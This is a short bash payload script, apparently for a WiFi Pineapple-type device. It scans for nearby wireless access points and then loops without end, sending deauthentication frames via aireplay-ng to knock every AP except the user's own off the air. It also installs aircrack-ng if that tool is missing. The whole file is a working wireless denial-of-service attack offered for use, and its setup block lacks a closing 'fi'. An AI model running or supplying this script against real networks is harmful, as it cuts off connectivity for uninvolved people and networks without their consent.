#!/bin/bash

function scan() {
    LED G
    ifconfig wlan0 down
    iwconfig wlan0 mode managed
    ifconfig wlan0 up
    AP_LIST=$(iwlist wlan0 scan | grep Address | awk '{ print $5 }')
}

function attack() {
    ifconfig wlan0 down
    iwconfig wlan0 mode monitor
    ifconfig wlan0 up
    LED R
    for a in $AP_LIST
    do
        if [ $a != $YOUR_AP_MAC ]; then
            aireplay-ng -0 20 -a $a wlan0
        fi
    done
    LED B
    sleep 10
    scan
    attack
}

if [ ! -f '/usr/sbin/aireplay-ng' ] ; then
    LED STAGE1
    NETMODE NAT
    until ping -c 1 8.8.8.8 >/dev/null ; do : ; done 
    opkg install aircrack-ng || LED FAIL

LED SETUP
AP_LIST=''
############ You can change this Variable to allow your AP to not be targeted
YOUR_AP_MAC='00:11:22:00:11:22'
scan
attack
